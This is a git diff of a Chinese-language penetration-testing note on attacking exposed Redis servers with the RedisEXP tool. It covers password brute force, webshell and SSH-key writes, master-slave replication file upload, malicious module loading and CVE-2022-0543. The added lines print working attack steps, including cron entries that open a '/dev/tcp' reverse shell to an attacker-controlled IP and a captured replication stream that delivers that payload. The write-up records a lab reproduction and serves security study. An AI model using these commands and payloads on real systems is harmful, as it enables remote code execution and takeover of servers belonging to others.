@@ -52,11 +52,11 @@ RedisEXP_windows_amd64.exe -m brute -r 192.168.110.179 -p 6379 -f pass.txt
 
 ### 写webshell
 
-* 条件：
-  * 知道网站绝对路径
-  * 可以任意写文件
-    * 需要该目录下的增删改查权限（这个一般需要redis以root权限运行或者于web服务器以相同的用户权限运行，还要防止selinux等一些权限控制系统，我在实验时通过apt包管理安装的redis默认运行在自动创建的用户redis下）
-    * 在6.x版本及以后，需将配置文件中的enable-protected-configs设置为yes，这个配置默认为no限制了我们使用config set dir
+条件：
+* 知道网站绝对路径
+* 可以任意写文件
+  * 需要该目录下的增删改查权限（这个一般需要redis以root权限运行或者于web服务器以相同的用户权限运行，还要防止selinux等一些权限控制系统，我在实验时通过apt包管理安装的redis默认运行在自动创建的用户redis下）
+  * 在6.x版本及以后，需将配置文件中的enable-protected-configs设置为yes，这个配置默认为no限制了我们使用config set dir
 
 这里搭建了一个简单的php站点，路径在`/www/wwwroot/192.168.110.177`下
 
@@ -75,7 +75,7 @@ save
 
 [原创 Paper | Windows 与 Java 环境下的 Redis 利用分析 (qq.com)](https://mp.weixin.qq.com/s/f7hPOoSSiRJpyMK51_Vxrw)
 
-* 工具
+工具：
 
 ```shell
 # -s后是写入的内容的base64，-b是解码选项
@@ -84,6 +84,8 @@ RedisEXP_windows_amd64.exe -m shell -r ip -p port -w password -rp /website/path 
 ```
 
 ### 写ssh-keygen公钥
+
+条件：
 
 * 和写webshell一样指定目录写文件的权限
 * 目标开放ssh服务，而且允许使用秘钥登录
@@ -110,7 +112,7 @@ set xxx "\n......\n"
 save
 ```
 
-* 工具
+工具：
 
 ```shell
 # 公钥两边的引号不要省略
@@ -118,6 +120,8 @@ RedisEXP_windows_amd64.exe -m ssh -r ip -p port -w password -u user -s "自己�
 ```
 
 ### 写计划任务
+
+条件：
 
 * 指定目录写文件的权限
 
@@ -139,7 +143,7 @@ config set dbfilename shell
 set xz "\n * bash -i >& /dev/tcp/192.168.33.131/8888 0>&1\n" 
 ```
 
-* 工具
+工具：
 
 ```shell
 RedisEXP_windows_amd64.exe -m cron -r 目标ip -p 目标端口 -w password -L 反连ip -P 反连端口
@@ -147,16 +151,145 @@ RedisEXP_windows_amd64.exe -m cron -r 目标ip -p 目标端口 -w password -L �
 
 ### redis主从复制getshell
 
-#### 远程主从
+> Redis如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。
+>
+> 在全量复制过程中,恢复rdb文件,如果我们将rdb文件构造为恶意的exp.so,从节点即会自动生成相同的文件,而在Redis4.x之后的版本，Redis新增了模块功能，可以加载外部.so文件，使得我们可以借此RCE
 
-#### 本地主从
+主从复制实际上也是通过写文件实现的rce，而且相较之前的save生成备份文件，有一个优势是，这个文件内容我们是完全可控的，所以主从复制同样可以结合之前的写webshell、ssh公钥、计划任务实现rce，而且成功率更高。
+
+这里主要介绍新的rce的方式，利用redis4.x后的模块功能，这样getshell相对于之前在权限方面的限制少很多，而且对于部署在docker容器内的redis也同样适用（当然只能get到容器内的shell）。
+
+利用的条件：
+
+* 可以通过主从复制实现任意文件上传
+  * 在6.x版本及以后，需将配置文件中的enable-protected-configs设置为yes，这个配置默认为no限制了我们使用config set dir
+  * 要上传的目录有权限（对于加载模块rce来说，这一点比较容易满足）
+* 可以加载模块
+  * redis 4.x以后
+  * 某些版本（没有具体测试），满足 enable-module-command的要求 
+  * 某些版本（4.0.9不需要，7.0.15需要，其他没具体测），要求加载的.so文件有执行权限，那这些版本就没办法利用了
+
+这里先复现主从复制的任意文件上传：
+
+由于需要构建一个恶意的redis服务器这里就直接用工具了
+
+```shell
+# 这里是写了一个ubuntu下的计划任务反弹shell
+RedisEXP_windows_amd64.exe -m upload -r 目标ip -p 目标port -w password -L 本地ip -P 本地port -rp /etc/cron.d -rf getshell -lf .\getshell
+```
+
+关于写的计划任务的内容，ubuntu的计划任务文件有个坑点，要求结尾必须有换行（这也看出了ubuntu下的计划任务格式之严格），但是如果只有换行，反弹的shell又会有错误的重定向的报错，解决方法是加上分号后再换行
+
+![image-20241015110925688](./images/image-20241015110925688.png)
+
+![image-20241015111233112](./images/image-20241015111233112.png)
+
+```txt
+# 这里结尾的分号和换行不能省略
+*/1 * * * * root /bin/bash -i >& /dev/tcp/192.168.110.80/9001 0>&1;
+
+```
+
+我们通过抓包看看这个过程发生了啥，主要分为两个部分，第一部分是在目标redis上进行一些操作，包括设置dir、dbfilename、将目标设置为恶意服务器的从服务器等，设置从服务器很简单的一条命令`slaveof 恶意服务ip 端口`
+
+![image-20241015160131586](./images/image-20241015160131586.png)
+
+设置为从服务器后，它就开始自动同步，下面是抓到的数据，注意到FULLRESYNC指令发出后，我们响应的内容就是要写入的恶意文件
+
+```txt
+*1
+$4
+PING
++PONG
+*3
+$8
+REPLCONF
+$14
+listening-port
+$4
+6379
++OK
+*5
+$8
+REPLCONF
+$4
+capa
+$3
+eof
+$4
+capa
+$6
+psync2
++OK
+*3
+$5
+PSYNC
+$40
+6e6627bea2ed66a68f10c683274786ece8281581
+$4
+4187
++FULLRESYNC 0000000000000000000000000000000000000000 1
+$69
+*/1 * * * * root /bin/bash -i >& /dev/tcp/192.168.110.80/9001 0>&1;
+
+
+```
+
+
+
+利用模块功能加载恶意dll或so，实现rce：
+
+前提是通过主从复制加载了一个恶意的dll或者so，但是这个过程的权限要相较于之前的写webshell等操作是宽松很多的，因为我们的恶意so最终是加载进redis使用的。
+
+同样的，我们先用工具测试
+
+```shell
+# 通过主从复制上传恶意exp.so，加载后获得shell，执行whoami
+RedisEXP_windows_amd64.exe -m rce -r 192.168.110.177 -p 6379 -w foobared -L 192.168.110.226 -P 2222 -c whoami -rf exp.so
+```
+
+从工具的输出我们可以看到两点，1，写入恶意so的目录和redis原本的dir设置是一致的（从工具的源码也可以看出），这就减小意味着一般情况下，redis都是有权限写入的；2，我的redis版本较高，7.0.15，这里因为enable-module-command的设置，造成了无法加载模块
+
+### ![image-20241015162453415](./images/image-20241015162453415.png)
+
+在我更改了设置后，仍然报错
+
+![image-20241015163650347](./images/image-20241015163650347.png)
+
+查看日志，显示exp.so没有可执行权限，所以无法加载
+
+![image-20241015163724865](./images/image-20241015163724865.png)
+
+将redis版本降低到4.0.9后就可以了
+
+![image-20241015165354809](./images/image-20241015165354809.png)
 
 ### CVE-2022-0543
+
+这个漏洞不是redis本身的问题，而是Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象`package`，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。所以，其实相对于是之前介绍的几种利用方式，个人觉得其利用面较窄。
+
+这里就不具体分析了，参考[vulhub/redis/CVE-2022-0543/README.zh-cn.md at master · vulhub/vulhub (github.com)](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md)，复现也使用该环境。
+
+直接工具一把梭
+
+```shell
+RedisEXP_windows_amd64.exe -m cve -r ip -p port -w password -c pwd
+```
+
+
 
 ## 其他用法
 
 * 探测目录
   * 利用config set dir，前提是有权限，若目录不存在会返回`(error) ERR Changing directory: No such file or directory`
+
+## 总结
+
+* 关于权限要求这一点，我有点不能理解，我的实验环境是在ubuntu2024的桌面版下，在写入文件时redis以root权限运行才能写入成功，setfacl设置了redis用户操作目录的权限或一个目录权限设置为777，可以`config set dir`成功，但是写入不成功
+
+![image-20241015115412752](./images/image-20241015115412752.png)
+
+![image-20241015123643917](./images/image-20241015123643917.png)
 
 ## 工具分析
 
